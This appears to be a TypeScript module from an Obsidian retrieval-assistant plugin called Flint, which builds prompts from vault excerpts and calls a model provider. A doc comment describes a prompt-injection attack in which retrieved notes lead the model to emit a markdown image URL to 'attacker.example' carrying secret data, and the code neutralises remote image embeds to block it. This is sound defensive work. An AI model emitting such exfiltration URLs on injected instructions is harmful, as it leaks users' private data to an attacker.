import type { VaultChunk, VaultIndex } from "../index/vault-index";
import { getProvider } from "../providers";
import type {
	ChatMessage,
	ChatOptions,
	TokenHandler,
} from "../providers/types";
import type { FlintSettings } from "../settings";

export interface PipelineOptions {
	/** Prior turns in the conversation, oldest first (not including the new query). */
	history?: ChatMessage[];
	/** Number of top chunks to retrieve from the vault index. */
	k?: number;
	/** When true (and `onToken` is given), streams via the provider's `streamChat`. */
	stream?: boolean;
	onToken?: TokenHandler;
	signal?: AbortSignal;
}

export interface PipelineResult {
	answer: string;
	citations: string[];
}

// `![alt](https://...)`, `![alt](http://...)`, or `![alt](//...)` — a remote
// image embed. Local vault paths, relative paths, and `data:` URIs don't
// match and are left untouched.
const REMOTE_IMAGE_MARKDOWN_PATTERN =
	/!\[([^\]]*)\]\((https?:\/\/[^)\s]+|\/\/[^)\s]+)\)/gi;

/**
 * Prevents assistant markdown from auto-loading remote images: a
 * prompt-injected clip in retrieved vault context can make the model emit
 * `![x](https://attacker.example/?data=<secret>)`, and Obsidian's
 * `MarkdownRenderer` would silently fetch it (exfiltration) as soon as it's
 * rendered. Turns remote image embeds into plain click-only links; local and
 * `data:` images are left as embeds.
 */
export function neutralizeRemoteImageMarkdown(markdown: string): string {
	return markdown.replace(
		REMOTE_IMAGE_MARKDOWN_PATTERN,
		(_match, alt: string, url: string) => `[${alt}](${url})`,
	);
}

export function buildSystemPrompt(chunks: VaultChunk[]): string {
	const intro =
		"You are Flint, an assistant embedded in the user's Obsidian vault. " +
		"Answer using the vault excerpts below wherever they are relevant, and " +
		"cite the note paths you drew on (e.g. by naming the path in parentheses). " +
		"If the excerpts don't answer the question, say so plainly and answer from " +
		"general knowledge instead.";

	if (chunks.length === 0) {
		return `${intro}\n\nNo relevant notes were found in the vault for this query.`;
	}

	const context = chunks
		.map((chunk, i) => {
			const header = chunk.heading
				? `${chunk.path} — ${chunk.heading}`
				: chunk.path;
			return `[${i + 1}] ${header}\n${chunk.text}`;
		})
		.join("\n\n---\n\n");

	return `${intro}\n\nVault excerpts:\n\n${context}`;
}

/**
 * Retrieves top-k vault chunks for the query, assembles a system prompt +
 * conversation, calls the active provider (streaming when requested), and
 * returns the answer plus the note paths cited as context.
 */
export async function runPipeline(
	query: string,
	settings: FlintSettings,
	index: VaultIndex,
	opts: PipelineOptions = {},
): Promise<PipelineResult> {
	const chunks = await index.retrieve(query, opts.k ?? settings.retrievalCount);
	const systemPrompt = buildSystemPrompt(chunks);

	const messages: ChatMessage[] = [
		{ role: "system", content: systemPrompt },
		...(opts.history ?? []),
		{ role: "user", content: query },
	];

	const provider = getProvider(settings);
	const chatOptions: ChatOptions = {
		model: settings.activeModel,
		signal: opts.signal,
	};

	const answer =
		opts.stream && opts.onToken
			? await provider.streamChat(messages, chatOptions, opts.onToken)
			: await provider.chat(messages, chatOptions);

	const citations = Array.from(new Set(chunks.map((chunk) => chunk.path)));

	return { answer, citations };
}
